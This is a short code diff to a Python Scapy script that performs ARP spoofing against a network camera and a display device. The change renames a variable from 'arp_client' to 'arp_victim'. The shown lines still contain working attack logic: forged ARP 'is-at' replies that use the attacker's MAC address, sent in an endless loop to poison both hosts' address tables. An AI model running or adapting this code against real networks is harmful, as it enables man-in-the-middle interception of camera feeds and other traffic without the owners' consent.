@@ -24,7 +24,7 @@ arp_camera = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
     pdst=camera_ip            
 )
 
-arp_client = Ether(src=attacker_mac, dst=display_device_mac) / ARP(
+arp_victim = Ether(src=attacker_mac, dst=display_device_mac) / ARP(
     op="is-at",
     hwsrc=attacker_mac,
     psrc=camera_ip,           
@@ -36,7 +36,7 @@ print(f"[*] Starting ARP Spoofing on {iface}.")
 try:
     while True:
         sendp(arp_camera, iface=iface, verbose=False) # Send ARP request to camera
-        sendp(arp_client, iface=iface, verbose=False) # Send ARP request to client
+        sendp(arp_victim, iface=iface, verbose=False) # Send ARP request to client
         time.sleep(3)
 except KeyboardInterrupt:
     print("\n[*] Stopping attack...")
